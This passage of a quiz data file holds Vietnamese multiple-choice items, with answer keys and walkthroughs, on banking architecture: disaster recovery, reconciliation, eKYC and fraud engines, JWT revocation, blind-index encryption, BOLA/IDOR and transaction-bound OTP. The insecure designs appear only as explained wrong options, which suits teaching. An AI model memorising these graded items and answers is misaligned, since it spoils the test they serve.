            "Chiến lược `Recreate` tắt toàn bộ Pod cũ trước khi Pod mới kịp khởi động sẽ gây ngừng dịch vụ toàn diện (Downtime 100% vài chục giây đến vài phút), vi phạm trực tiếp SLA 99,99%."
          ],
          "tip": "Luật sắt K8s Ngân hàng: `livenessProbe` KHÔNG BAO GIỜ check hệ thống phụ thuộc bên ngoài; còn Zero-Downtime Rollout = `readinessProbe` + `preStop sleep 5s` + `server.shutdown=graceful` + `terminationGracePeriodSeconds` đủ rộng!"
        }
      },
      {
        "id": "R3-08",
        "domain": "Multi-DC Active-Active, DR (RPO/RTO) & Kill-Switch (O6)",
        "lessonId": "O6",
        "difficulty": "Khó",
        "caseStudy": r3CaseStudy,
        "question": "VietFinBank vận hành trên 2 Trung tâm dữ liệu (DC Hòa Lạc và DC Tân Thuận) với yêu cầu bắt buộc từ Ban Điều hành cho Core Ledger là RPO = 0 và RTO < 10 phút, đồng thời vừa ra mắt thêm tính năng 'Ứng tiền nhanh theo hóa đơn VietQR'. Kiến trúc hạ tầng dữ liệu và quản trị rủi ro vận hành nào đáp ứng chuẩn xác các mục tiêu này?",
        "options": [
          "Cấu hình PostgreSQL Asynchronous Replication gửi WAL log định kỳ mỗi 5 phút từ DC Hòa Lạc sang DC Tân Thuận; nếu tính năng 'Ứng tiền nhanh' gặp lỗi logic thì tạo Merge Request sửa code rồi chạy lại pipeline CI/CD mất 25 phút.",
          "Thiết kế cơ sở dữ liệu sổ cái sao chép đồng bộ theo cơ chế Quorum (Synchronous Commit / Quorum Replication qua tuyến cáp quang riêng độ trễ thấp để giao dịch chỉ báo thành công khi nhật ký WAL/Redo đã bền vững ở cả cụm dự phòng đảm bảo RPO = 0), tự động hóa kịch bản chuyển đổi dự phòng (Automated Failover & GSLB/DNS Traffic Switch đã kiểm chứng qua DR Drill định kỳ để đạt RTO < 10 phút), và bọc tính năng 'Ứng tiền nhanh' sau công tắc ngắt khẩn cấp (Feature Kill-Switch động) tắt được tức thì trong dưới 5 giây mà không cần redeploy.",
          "Sao lưu toàn bộ Database ra băng từ (Tape Backup) vào lúc 23h59 hằng đêm chở sang DC Tân Thuận và lưu cấu hình bật/tắt tính năng cứng trong file `application.yml` đóng gói chết bên trong Docker Image.",
          "Cho cả 2 DC cùng ghi tự do bất đồng bộ (Multi-master Async Write) vào cùng một tài khoản không cần khóa hay kiểm soát xung đột, ai ghi sau thì đè lên số dư của người ghi trước (Last-Write-Wins)."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "2 Trung tâm dữ liệu ... RPO = 0 và RTO < 10 phút ... ra mắt tính năng tài chính mới 'Ứng tiền nhanh'",
          "whyCorrect": "Tư duy chuẩn mực của một Principal SRE/Architect ngân hàng nằm trọn ở phương án này! Hãy nhớ hai chỉ số sống còn: **RPO (Recovery Point Objective) = 0** nghĩa là khi DC1 mất điện toàn vùng hoặc đứt cáp đột ngột, **số dữ liệu giao dịch đã commit bị mất phải bằng 0** — điều này bắt buộc tầng lưu trữ sổ cái phải dùng **Synchronous / Quorum Replication** (WAL log được xác nhận ghi an toàn sang node đồng bộ liên DC trước khi trả kết quả thành công). **RTO (Recovery Time Objective) < 10 phút** đòi hỏi tự động hóa chuyển hướng lưu lượng (GSLB/BGP + Patroni/DataGuard failover) và phải diễn tập **DR Drill** thật định kỳ. Cuối cùng, mọi sản phẩm tài chính mới lên Production đều phải có **Feature Kill-Switch** quản lý tập trung (Unleash/Consul/Redis) để ngắt cầu dao trong 5 giây ngay khi phát hiện dấu hiệu trục lợi bất thường!",
          "whyWrong": [
            "Sao chép bất đồng bộ (Async Replication) trễ 5 phút đồng nghĩa với RPO = 5 phút: nếu DC1 gặp thảm họa, toàn bộ hàng chục nghìn giao dịch chuyển tiền đã báo thành công trong 5 phút cuối sẽ bốc hơi hoàn toàn!",
            "",
            "Backup hằng đêm chỉ cho RPO = 24 giờ và khôi phục từ băng từ mất nhiều giờ (vỡ cả RPO lẫn RTO); còn nhét cờ tính năng chết cứng trong Docker Image thì lúc khẩn cấp không thể ngắt nóng ngay được.",
            "Cơ chế `Last-Write-Wins` (ghi đè theo đồng hồ) trên dữ liệu số dư tiền tệ ở 2 DC sẽ xóa sạch biến động cộng/trừ tiền xảy ra đồng thời, gây thất thoát tiền nghiêm trọng."
          ],
          "tip": "Giải mã nhanh bài thi DR: `RPO = 0` -> Bắt buộc `Synchronous / Quorum WAL Replication` (cấm Async/Last-Write-Wins); `RTO < 10 phút` -> `Automated Failover + DR Drill`; Tính năng tài chính mới -> Luôn có `Dynamic Kill-Switch`!"
        }
      },
      {
        "id": "R3-09",
        "domain": "Hệ thống Đối soát Tự động T+0/T+1 (B4)",
        "lessonId": "B4",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Vào lúc 00h30 sáng hằng ngày, hệ thống Đối soát Tự động (Reconciliation Engine) của ngân hàng phải đối chiếu 2,5 triệu giao dịch giữa 3 nguồn: Sổ cái Core Banking, Nhật ký Payment Hub và File quyết toán chuẩn của tổ chức chuyển mạch đối tác trong thời gian dưới 60 giây mà không làm tràn bộ nhớ Heap 2GB. Kiến trúc thuật toán nào tối ưu nhất?",
        "options": [
          "Dùng `JpaRepository.findAll()` nạp toàn bộ 2,5 triệu Entity từ DB và toàn bộ file CSV của đối tác vào hai `ArrayList` trong bộ nhớ rồi chạy hai vòng lặp `for` lồng nhau $O(N^2)$ để so khớp từng mã tham chiếu.",
          "Gọi REST API tra cứu từng giao dịch một sang cổng đối tác 2,5 triệu lần liên tiếp qua mạng Internet vào lúc nửa đêm.",
          "Sắp xếp trước cả luồng dữ liệu nội bộ (qua Cursor/Keyset Streaming theo `rrn`/`trace_id` tăng dần) và luồng file đối tác (External Merge Sort), sau đó thực hiện thuật toán **Sort-Merge Streaming Join** một lượt $O(N)$ đọc theo từng chunk cố định để phân loại chính xác 4 nhóm lệch (`MATCHED`, `MISSING_IN_PARTNER`, `MISSING_IN_CORE`, `AMOUNT_OR_STATUS_MISMATCH`) và đẩy danh sách lệch sang quy trình hạch toán xử lý từ tài khoản treo Suspense GL.",
          "Chỉ so sánh tổng số tiền cộng gộp cả ngày của Core Banking với tổng số tiền cuối file của đối tác; nếu hai con số tổng bằng nhau thì kết luận 100% giao dịch đều khớp và bỏ qua đối chiếu chi tiết từng dòng."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "đối chiếu 2,5 triệu giao dịch giữa 3 nguồn ... trong dưới 60 giây mà không làm tràn bộ nhớ Heap 2GB",
          "whyCorrect": "Bài toán kinh điển của đội Thanh toán & Đối soát đây rồi em! Với 2,5 triệu bản ghi mỗi bên, nhồi hết Entity vào RAM sẽ ngốn hàng chục GB Heap gây nổ `OutOfMemoryError`, còn chạy vòng lặp lồng nhau $O(N^2)$ tương đương $6,25 \\times 10^{12}$ phép so sánh (mất nhiều ngày chưa xong!). Giải pháp chuẩn Production là **Sort-Merge Streaming Reconciliation**: cả nguồn DB lẫn file đối tác đều được sắp xếp theo khóa đối soát chuẩn (`RRN` + `Date`), sau đó dịch chuyển 2 con trỏ tuần tự (Two-pointer Merge Scan) theo từng luồng chunk nhỏ — độ phức tạp thời gian chỉ $O(N \\log N)$ cho bước sort và $O(N)$ cho bước khớp, tốn chưa tới vài chục MB RAM và chạy xong 2,5 triệu dòng chỉ trong 15–25 giây!",
          "whyWrong": [
            "`findAll()` 2,5 triệu dòng JPA Entity chắc chắn gây `OutOfMemoryError` trên Pod 2GB RAM, còn hai vòng lặp `for` lồng nhau $O(N^2)$ sẽ treo cứng tiến trình suốt cả ngày.",
            "Bắn 2,5 triệu request HTTP lẻ qua mạng vừa mất hàng nhiều giờ đồng hồ, vừa vi phạm giới hạn Rate Limit và chính sách vận hành của tổ chức chuyển mạch (đối soát chuẩn luôn dùng Batch Settlement File như `camt.053` hoặc file CSV/Fixed-length ký số).",
            "",
            "Chỉ khớp tổng tiền (Net Total) sẽ bỏ lọt hoàn toàn trường hợp lệch bù trừ nguy hiểm: giao dịch của Ông A thừa 10 triệu đồng trong khi giao dịch của Bà B thiếu đúng 10 triệu đồng — tổng vẫn bằng nhau nhưng 2 khách hàng đều bị sai tiền!"
          ],
          "tip": "Đối soát triệu dòng trên RAM nhỏ: Tuyệt đối né `findAll()` và vòng lặp $O(N^2)$; dùng **Sort-Merge Two-Pointer Streaming** (hoặc Partitioned Hash Bucket theo chunk) để quét $O(N)$ siêu tốc!"
        }
      },
      {
        "id": "R3-10",
        "domain": "eKYC NFC CCCD & Chống Gian lận AML/Fraud (B5)",
        "lessonId": "B5",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ngân hàng triển khai quy định xác thực sinh trắc học & định danh điện tử (eKYC) cho giao dịch chuyển tiền trên 10 triệu VNĐ và nâng cấp Real-time Fraud Rule Engine đặt trực tiếp trên luồng thanh toán. Thiết kế nào vừa chống được tội phạm dùng video Deepfake / giấy tờ giả, vừa đảm bảo hiệu năng và an toàn vận hành?",
        "options": [
          "Chỉ chụp ảnh mặt trước thẻ CCCD bằng camera thường không đọc chip NFC, còn khi Fraud Rule Engine bị quá tải vượt quá 50ms thì mặc định trả về `ALLOW` cho mọi giao dịch kể cả chuyển 2 tỷ đồng lúc 3 giờ sáng từ thiết bị lạ.",
          "Lưu ảnh chân dung sinh trắc học gốc không mã hóa trên S3 Public Bucket để ứng dụng Mobile tải về tự so khớp khuôn mặt ngay trên điện thoại khách hàng nhằm tiết kiệm CPU cho Server.",
          "Chạy câu truy vấn tổng hợp lịch sử giao dịch 12 tháng trực tiếp trên bảng OLTP mỗi khi khách bấm chuyển tiền khiến thời gian phản hồi mỗi giao dịch tăng lên 9 giây.",
          "Kết hợp đọc dữ liệu từ chip NFC trên thẻ CCCD gắn chip kèm xác thực chữ ký số của cơ quan cấp phát (CA Bộ Công an / RAR) + kiểm tra thực thể sống chủ động/thụ động (Liveness Detection chống Deepfake) đối khớp khuôn mặt; đồng thời thiết kế Fraud Engine đánh giá trong < 30ms dựa trên Feature Store bộ nhớ trong và áp dụng chính sách **Risk-tiered Fail-safe**: giao dịch nhỏ/người nhận quen cho phép qua kèm cảnh báo hậu kiểm, nhưng giao dịch giá trị lớn/thiết bị mới/khung giờ bất thường bắt buộc kích hoạt `STEP_UP_AUTH` hoặc `HOLD_FOR_REVIEW`."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "chống Deepfake / giấy tờ giả ... Real-time Fraud Rule Engine đặt trực tiếp trên luồng thanh toán",
          "whyCorrect": "Rất thực tế với bối cảnh Quyết định 2345/QĐ-NHNN và Thông tư 50 tại Việt Nam! Tội phạm công nghệ cao ngày nay có thể in thẻ nhựa giả cực tinh vi hoặc chèn luồng camera ảo (Virtual Camera Deepfake), nhưng chúng **không thể giả mạo chữ ký số mật mã học bên trong con chip NFC của CCCD** do Trung tâm RAR - Bộ Công an ký phát hành! Kết hợp xác thực chữ ký chip NFC + Liveness Detection tại phía Server giúp triệt tiêu giả mạo định danh. Đối với Fraud Engine nằm trên đường găng (Critical Path), mọi chỉ số Velocity (số lần chuyển trong 5 phút, tổng tiền 1 giờ) phải đọc sẵn từ Redis/In-memory Feature Store dưới 30ms, và khi dịch vụ chấm điểm nâng cao gặp sự cố thì phải **Fail-safe phân tầng theo rủi ro** (không chặn oan khách mua ly cà phê 30.000đ, nhưng tuyệt đối không thả rông lệnh rút 2 tỷ từ thiết bị lạ lúc nửa đêm!).",
          "whyWrong": [
            "Chỉ OCR ảnh chụp 2D rất dễ bị qua mặt bởi ảnh ghép chất lượng cao; nguy hiểm hơn, chính sách `Fail-open (ALLOW tất cả)` cho cả giao dịch 2 tỷ đồng từ thiết bị lạ sẽ bị tội phạm lợi dụng đánh sập/làm nghẽn Fraud Service để rút sạch tiền.",
            "Mở Public Bucket chứa dữ liệu sinh trắc học và đẩy logic đối khớp khuôn mặt về phía Client là lỗ hổng bảo mật thảm khốc: vừa lộ dữ liệu cá nhân nhạy cảm (vi phạm Nghị định 13/Luật Bảo vệ DLCN), vừa bị kẻ tấn công patch App trả về `match = true` 100%.",
            "Quét lịch sử 12 tháng trực tiếp trên DB OLTP ở từng lệnh thanh toán sẽ làm sập Core Database ngay giờ cao điểm (dữ liệu tổng hợp hành vi phải được tính sẵn qua Stream Processing như Flink/Kafka Streams vào Redis).",
            ""
          ],
          "tip": "Chống giả mạo eKYC chuẩn NHNN = `Đọc chip NFC CCCD (xác thực chữ ký số RAR)` + `Server-side Liveness & Face Match`; Fraud Engine trên luồng nóng = `In-memory Velocity < 30ms` + `Risk-tiered Fail-safe`!"
        }
      },
      {
        "id": "R3-11",
        "domain": "OAuth 2.1, OIDC & Quản trị Token Ngân hàng (K1)",
        "lessonId": "K1",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Khách hàng gọi tổng đài khẩn cấp lúc 14h05 báo vừa bị cướp giật điện thoại đang mở sẵn ứng dụng Mobile Banking. Đội ngũ kỹ thuật trước đó cấu hình JWT Access Token có thời hạn sống (TTL) 24 giờ và chỉ kiểm tra chữ ký RS256 cục bộ mà không có cơ chế thu hồi. Bạn phải thiết kế lại vòng đời Token theo chuẩn OAuth 2.1 Ngân hàng như thế nào?",
        "options": [
          "Tiếp tục để Access Token sống 24 giờ cho đỡ tốn tài nguyên nhưng dặn tổng đài viên bảo khách hàng ráng chờ tới 14h05 ngày hôm sau Token sẽ tự hết hạn.",
          "Áp dụng luồng Authorization Code + PKCE; rút ngắn thời hạn sống của JWT Access Token xuống 3–5 phút kèm kiểm tra `jti` / mốc khóa tài khoản `revoked_after` trên bộ nhớ đệm Redis siêu nhanh (Sub-millisecond Denylist) để thu hồi quyền truy cập tức thì ngay giây khách báo khóa máy; đồng thời bật **Refresh Token Rotation kèm Reuse Detection** (hễ một Refresh Token cũ đã xoay vòng mà bị đem ra dùng lại lần 2 thì lập tức hủy toàn bộ chuỗi phiên Token Family của thiết bị đó).",
          "Đổi thuật toán ký JWT từ RS256 sang `alg: none` để API Gateway khỏi mất thời gian xác minh chữ ký số.",
          "Nhúng mật khẩu đăng nhập và số dư tài khoản hiện tại vào thẳng phần Payload của JWT vì JWT đã được mã hóa chống đọc trộm mặc định."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "bị cướp giật điện thoại ... JWT Access Token TTL 24 giờ không có cơ chế thu hồi ... chuẩn OAuth 2.1 Ngân hàng",
          "whyCorrect": "Quá sắc sảo! Rất nhiều lập trình viên quên mất nhược điểm chí tử của Stateless JWT: nếu cấp hạn 24 giờ mà chỉ verify chữ ký RS256, kẻ cướp cầm máy sẽ ung dung rút sạch tiền trong suốt 23 giờ 59 phút dù ngân hàng đã bấm 'Khóa tài khoản' trên DB! Thiết kế chuẩn OAuth 2.1 cho Mobile/Web Banking gồm 3 trụ cột: (1) **Authorization Code + PKCE** chống đánh cắp code trao đổi; (2) **Short-lived Access Token (3–5 phút)** kết hợp tra cứu Redis Denylist theo `jti` hoặc `user_token_invalid_before_ts` để vô hiệu hóa tức khắc dưới 1 mili-giây khi khách báo mất máy hay đổi mật khẩu; (3) **Refresh Token Rotation + Reuse Detection** giúp phát hiện ngay lập tức nếu Refresh Token bị đánh cắp (khi cả kẻ trộm lẫn người dùng thật cùng mang 1 thế hệ token đi làm mới, máy chủ hủy sạch cả họ `token_family` ngay!).",
          "whyWrong": [
            "Để kẻ cướp có quyền thao tác tài khoản ngân hàng thêm 24 giờ sau khi khách đã báo khóa khẩn cấp là lỗi an ninh không thể chấp nhận được và ngân hàng phải bồi thường thiệt hại.",
            "",
            "Chấp nhận `alg: none` là lỗ hổng bảo mật kinh điển bậc nhất của thư viện JWT, cho phép bất kỳ ai tự chế tạo Token admin mà không cần khóa bí mật.",
            "Hiểu sai cơ bản về JWT (JWS): phần Payload chỉ được mã hóa hiển thị **Base64Url** (ai dùng trang jwt.io cũng giải mã đọc rõ mồn một trong 1 giây!), hoàn toàn KHÔNG được mã hóa bảo mật trừ khi dùng JWE."
          ],
          "tip": "Quản trị JWT cấp độ Ngân hàng = `PKCE` + `Short Access Token (3–5p)` + `Redis Denylist (jti / invalidBefore)` + `Refresh Token Rotation & Reuse Detection`!"
        }
      },
      {
        "id": "R3-12",
        "domain": "Mật mã học, HSM, Envelope Encryption & Blind Index (K3)",
        "lessonId": "K3",
        "difficulty": "Khó (Bẫy thực chiến)",
        "caseStudy": null,
        "question": "Bạn cần mã hóa cột số căn cước công dân (`national_id`) trên bảng `customers` có 10 triệu dòng bằng khóa chủ quản lý trong HSM/KMS, nhưng quầy giao dịch vẫn yêu cầu câu truy vấn tìm kiếm chính xác khách hàng theo số CCCD (`WHERE ...`) phải phản hồi dưới 5 mili-giây bằng B-Tree Index. Giải pháp mật mã học nào vừa an toàn tuyệt đối vừa đạt hiệu năng truy vấn?",
        "options": [
          "Dùng thuật toán `AES-256-ECB` không có IV để cùng một số CCCD luôn sinh ra cùng một chuỗi bản mã y hệt nhau, rồi đánh B-Tree Index trực tiếp lên cột bản mã đó.",
          "Dùng `AES-256-GCM` nhưng gán cứng một mảng hằng số `byte[12]` toàn số 0 làm IV chung cho mọi khách hàng để kết quả mã hóa mang tính tất định tìm kiếm được.",
          "Gửi 10 triệu bản ghi qua mạng sang thiết bị phần cứng HSM để HSM giải mã toàn bộ bảng mỗi khi giao dịch viên bấm tìm kiếm một khách hàng.",
          "Áp dụng **Envelope Encryption** (dùng Master Key KEK trong HSM/KMS bọc Data Encryption Key DEK) để mã hóa `national_id` bằng **AES-256-GCM với IV 12 bytes ngẫu nhiên duy nhất cho từng lần ghi**, ĐỒNG THỜI tạo thêm một cột phụ `national_id_bidx` lưu giá trị băm có khóa **Blind Index (`HMAC-SHA256(blindIndexSecretKey, normalizedNationalId)`)** với một khóa bí mật tách biệt và đánh B-Tree Index trên cột `national_id_bidx` này."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "mã hóa cột `national_id` trên bảng 10 triệu dòng ... vẫn tìm kiếm chính xác khách hàng theo số CCCD dưới 5ms bằng B-Tree Index",
          "whyCorrect": "Đây là kỹ thuật thực chiến đỉnh cao mà mọi Senior Backend làm mảng Core Customer (CIF) đều phải thuộc nằm lòng! Hãy nhìn mâu thuẫn cốt lõi: mã hóa chuẩn an toàn ngữ nghĩa (Semantic Security) như **AES-256-GCM bắt buộc dùng IV 12-byte ngẫu nhiên mỗi lần mã hóa**, nghĩa là cùng một số CCCD `'001095001234'` mã hóa 2 lần sẽ ra 2 chuỗi ciphertext khác hẳn nhau -> không thể tìm bằng `WHERE encrypted_cccd = ?`! Để hóa giải mà không làm yếu thuật toán mã hóa, ta kết hợp: (1) Cột `national_id_enc` dùng **Envelope Encryption + AES-256-GCM (random 12-byte IV)** để bảo vệ dữ liệu gốc và giải mã hiển thị khi cần; (2) Cột `national_id_bidx` lưu **Blind Index dùng `HMAC-SHA256`** với một khóa bí mật riêng lưu trong Vault/HSM — khi tìm kiếm chỉ cần tính `HMAC` của số CCCD cần tra rồi truy vấn `WHERE national_id_bidx = :hmac` ăn thẳng vào B-Tree Index trong 1–2ms!",
          "whyWrong": [
            "Chế độ `ECB` làm lộ mẫu dữ liệu lặp và cho phép kẻ tấn công so sánh/ghép khối bản mã mà không cần khóa; nếu dùng cho các trường có miền giá trị hẹp còn dễ bị tấn công bảng tra cứu.",
            "Tái sử dụng cùng một `(Key, IV)` trong chế độ `AES-GCM` là thảm họa mật mã học chí tử (Nonce Reuse Attack): chỉ cần lấy XOR hai bản mã là lộ ngay XOR của hai bản rõ và cho phép khôi phục khóa xác thực GHASH giả mạo dữ liệu!",
            "Thiết bị HSM phần cứng được thiết kế để bảo vệ khóa chủ (KEK) và ký số/bọc DEK, băng thông mạng và chip HSM không bao giờ dùng để giải mã quét toàn bảng 10 triệu dòng ở mỗi câu `SELECT`!",
            ""
          ],
          "tip": "Mã hóa trường nhạy cảm trong DB mà vẫn cần `WHERE field = ?` ăn Index dưới 5ms -> Bộ đôi bất bại: `AES-256-GCM (Random 12-byte IV + Envelope DEK/KEK)` cho cột lưu trữ + `HMAC-SHA256 Blind Index` (khóa riêng) cho cột tìm kiếm!"
        }
      },
      {
        "id": "R3-13",
        "domain": "Phòng thủ OWASP API Top 10 & BOLA/IDOR (K5)",
        "lessonId": "K5",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Trong đợt Pentest định kỳ trước ngày Go-live, chuyên gia bảo mật đăng nhập bằng tài khoản cá nhân hợp lệ (CIF `100088`), sau đó sửa tham số trên API `GET /api/v1/receipts/TXN-2026-999123/pdf` (vốn là mã giao dịch của một khách hàng VIP khác có CIF `100001`) và tải về thành công biên lai chứa đầy đủ họ tên, số tài khoản và nội dung chuyển tiền của khách VIP đó! Đây là lỗ hổng gì và cách khắc phục triệt để nhất là gì?",
        "options": [
          "Đây là lỗ hổng SQL Injection; cách sửa là cài thêm Web Application Firewall (WAF) chặn ký tự dấu gạch ngang `-` trên đường dẫn URL.",
          "Đây là lỗ hổng Cross-Site Scripting (XSS); cách sửa là mã hóa HTML toàn bộ tệp PDF trước khi trả về trình duyệt.",
          "Đây là lỗ hổng **BOLA / IDOR (OWASP API1:2023 - Broken Object Level Authorization)**; cách sửa triệt để là luôn trích xuất `authenticatedCif` từ SecurityContext (JWT đã xác thực, tuyệt đối không tin `cif` gửi từ request) và thực thi kiểm tra quyền sở hữu ở tầng truy vấn dữ liệu (`findByTxnRefAndParticipantCif(txnRef, authenticatedCif)` hoặc `@PreAuthorize` kiểm chứng chủ sở hữu), đồng thời dùng định danh không tuần tự khó đoán (UUIDv4/ULID ngẫu nhiên) cho tài nguyên đối ngoại.",
          "Chỉ cần giấu đường dẫn API này khỏi tài liệu Swagger UI trên môi trường Production là kẻ tấn công sẽ không biết API tồn tại để gọi."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "đăng nhập hợp lệ (CIF 100088) ... sửa mã giao dịch trên URL sang giao dịch của khách VIP khác (CIF 100001) và tải thành công biên lai",
          "whyCorrect": "90% biên bản lỗi Critical trong các đợt Pentest ngân hàng đều mang tên lỗ hổng này: **BOLA (Broken Object Level Authorization)** hay tên truyền thống là **IDOR** — đứng vị trí số 1 trong OWASP API Security Top 10! Lập trình viên thường yên tâm vì thấy API đã bắt buộc đăng nhập (`authenticated()`), nhưng quên mất *'Đăng nhập hợp lệ chỉ chứng minh anh là khách của ngân hàng, KHÔNG chứng minh anh là chủ của cái tài khoản hay tờ biên lai kia!'*. Cách khóa chặt từ gốc là nhúng điều kiện sở hữu ngay vào câu truy vấn Repository (`WHERE txn_ref = :ref AND (sender_cif = :authCif OR allowed_viewer_cif = :authCif)`), lấy `authCif` trực tiếp từ `SecurityContextHolder` phía Server chứ không bao giờ đọc `cif` từ query param hay body do Client gửi lên!",
          "whyWrong": [
            "Truyền mã `TXN-2026-999123` hợp lệ không hề tiêm mã độc SQL nào cả, nên WAF chống SQLi hoàn toàn cho qua bình thường.",
            "XSS là lỗi chèn mã JavaScript thực thi trên trình duyệt nạn nhân, không liên quan tới việc máy chủ trả nhầm biên lai PDF của người khác.",
            "",
            "Bảo mật dựa trên sự che giấu (Security through Obscurity) là vô tác dụng: chỉ cần người dùng mở F12 Network tab trên chính giao diện hợp pháp của họ là thấy ngay cấu trúc URL để thay mã giao dịch khác vào."
          ],
          "tip": "Mọi API Ngân hàng nhận `accountNo`, `cardId`, `txnRef`, `loanId` từ Client -> Phải phản xạ ngay lập tức câu hỏi chống BOLA: *'Code đã đối chiếu ID tài nguyên này thuộc đúng `CIF` lấy từ JWT trong `SecurityContext` chưa?'*"
        }
      },
      {
        "id": "R3-14",
        "domain": "Smart OTP (OCRA) & Audit Trail Bất biến (K6)",
        "lessonId": "K6",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Kẻ gian cài mã độc trên trình duyệt máy tính của kế toán trưởng (tấn công Man-in-the-Browser): trên màn hình vẫn hiển thị lệnh chuyển 500 triệu VNĐ cho 'Nhà cung cấp Thép Hòa Phát', nhưng ngay khoảnh khắc bấm gửi, mã độc âm thầm sửa JSON payload dưới ngầm thành tài khoản của kẻ lừa đảo. Nếu kế toán trưởng nhập mã TOTP 6 số thông thường (chỉ dựa theo thời gian 30 giây), giao dịch vẫn lọt qua! Cơ chế xác thực và lưu vết nào chặn đứng kịch bản này?",
        "options": [
          "Tăng độ dài mã TOTP theo thời gian từ 6 chữ số lên 8 chữ số và rút chu kỳ xoay số từ 30 giây xuống 15 giây.",
          "Triển khai **Transaction-bound Smart OTP theo chuẩn OCRA (RFC 6287)** hoặc ký số giao dịch FIDO2/ Asymmetric Key trên Secure Enclave của điện thoại: màn hình thiết bị độc lập hiển thị rõ số tiền + số tài khoản nhận và tính mã OTP bằng hàm `HMAC(deviceSecret, challenge | toAccountNo | amount | currency)`; khi mã độc tráo `toAccountNo` trên đường truyền, máy chủ tính lại chữ ký với tài khoản kẻ gian sẽ lệch hoàn toàn và chặn đứng giao dịch! Đồng thời ghi nhật ký vào bảng Audit Trail dạng chuỗi băm móc xích (**Tamper-evident Hash Chain**: `row_hash = SHA256(prev_hash + payload)`).",
          "Gửi mã OTP đồng thời qua cả SMS lẫn Email đến cùng chiếc máy tính đang bị nhiễm mã độc.",
          "Yêu cầu kế toán trưởng nhập lại mật khẩu đăng nhập tĩnh thêm một lần nữa trước khi bấm nút Xác nhận trên trình duyệt."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "Man-in-the-Browser ... màn hình hiển thị Nhà cung cấp nhưng mã độc sửa JSON payload dưới ngầm thành tài khoản kẻ lừa đảo ... TOTP thông thường vẫn lọt",
          "whyCorrect": "Em thấy sự lợi hại của **Transaction Data Signing / OCRA (OATH Challenge-Response Algorithm - RFC 6287)** chưa! Điểm mù của SMS OTP thường hay Google Authenticator (TOTP RFC 6238) là mã 6 số đó chỉ phụ thuộc vào `(Khóa bí mật + Đồng hồ thời gian)` — nó hoàn toàn 'mù' trước việc khách hàng đang chuyển bao nhiêu tiền và chuyển cho ai! Ngược lại, **Smart OTP gắn ngữ cảnh giao dịch (Dynamic Linking)** đưa trực tiếp `toAccountNo` và `amount` vào hàm tạo mã trên kênh độc lập (ứng dụng Mobile trên điện thoại đọc QR challenge hoặc nhận Push hiển thị rõ *'Bạn đang ký chuyển 500.000.000đ tới TK 1903xxx'*). Chỉ cần mã độc trên trình duyệt PC sửa dù 1 chữ số của `toAccountNo` hay `amount`, giá trị kiểm chứng phía Backend sẽ sai khác ngay lập tức! Cộng thêm **Hash Chain Audit Log** giúp mọi hành vi can thiệp sửa xóa nhật ký về sau đều bị phát hiện đứt mắt xích băm.",
          "whyWrong": [
            "Tăng lên 8 số hay giảm xuống 15 giây nhưng không gắn `toAccountNo` và `amount` vào công thức tính OTP thì mã độc vẫn lấy nguyên mã 8 số vừa nhập đính kèm vào gói tin đã bị tráo tài khoản nhận!",
            "",
            "Dù gửi qua SMS hay Email thì bản thân mã OTP tĩnh không ràng buộc nội dung giao dịch vẫn bị chiếm dụng tráo lệnh y hệt.",
            "Nhập lại mật khẩu tĩnh ngay trên trình duyệt đã nhiễm Man-in-the-Browser thậm chí còn dâng luôn mật khẩu đăng nhập cho mã độc keylogger."
          ],
          "tip": "Chống tráo đổi người nhận/số tiền (MitB / Phishing) -> Bắt buộc dùng **Transaction-bound Smart OTP (OCRA RFC 6287)** hoặc **Chữ ký số giao dịch (Dynamic Linking)** ràng buộc chặt `toAccount + amount`!"
        }
      },
      {
        "id": "R3-15",
        "domain": "Tối ưu Docker Container cho Java 21 & Chống OOMKilled (O1)",
        "lessonId": "O1",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Một dịch vụ xử lý thanh toán viết bằng Java 21 được đóng gói Docker chạy trên Kubernetes với giới hạn tài nguyên Pod `resources.limits.memory: 2Gi` (2048 MB). Lập trình viên đặt biến khởi động `JAVA_TOOL_OPTIONS=\"-Xms2048m -Xmx2048m\"` và chạy container dưới quyền mặc định `root`. Sau 2 giờ chịu tải cao, Pod liên tục chết đột ngột với mã `OOMKilled (Exit Code 137)` dù không hề có dòng log `java.lang.OutOfMemoryError` nào của JVM! Nguyên nhân gốc rễ và cách khắc phục chuẩn là gì?",
        "options": [
          "Do Java 21 không tương thích với cgroups v2 của Linux; phải hạ cấp toàn bộ hệ thống ngân hàng về Java 8 để chạy ổn định.",
          "Giữ nguyên `-Xmx2048m` nhưng xóa bỏ hoàn toàn `resources.limits.memory` trên toàn bộ các Pod trong cụm Kubernetes để một Pod bị rò rỉ bộ nhớ có thể ăn hết sạch 128 GB RAM của cả máy chủ vật lý.",
          "Do thiếu cờ `-XX:+DisableExplicitGC` nên Linux tự xóa container định kỳ mỗi 2 giờ.",
          "Tổng bộ nhớ thực tế của tiến trình JVM bằng `Heap (-Xmx) + Metaspace + Direct/Off-Heap Buffers (Netty/NIO) + Thread Stacks + CodeCache + GC Overhead`; đặt `-Xmx2048m` bằng khít giới hạn Pod `2Gi` khiến tổng RSS vượt 2048 MB nên bị Linux Kernel cgroups OOM Killer bắn `SIGKILL (137)` từ bên ngoài trước khi JVM kịp ném lỗi! Cách sửa chuẩn: cấu hình `-XX:MaxRAMPercentage=70.0` (chừa ~30% trần RAM cho Non-Heap), dùng Multi-stage Dockerfile tách Layered JARs và chạy bằng tài khoản `USER nonroot` (UID > 10000) với filesystem chỉ đọc."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "limits.memory: 2Gi ... -Xms2048m -Xmx2048m ... chết đột ngột OOMKilled (Exit Code 137) không có log OutOfMemoryError của JVM",
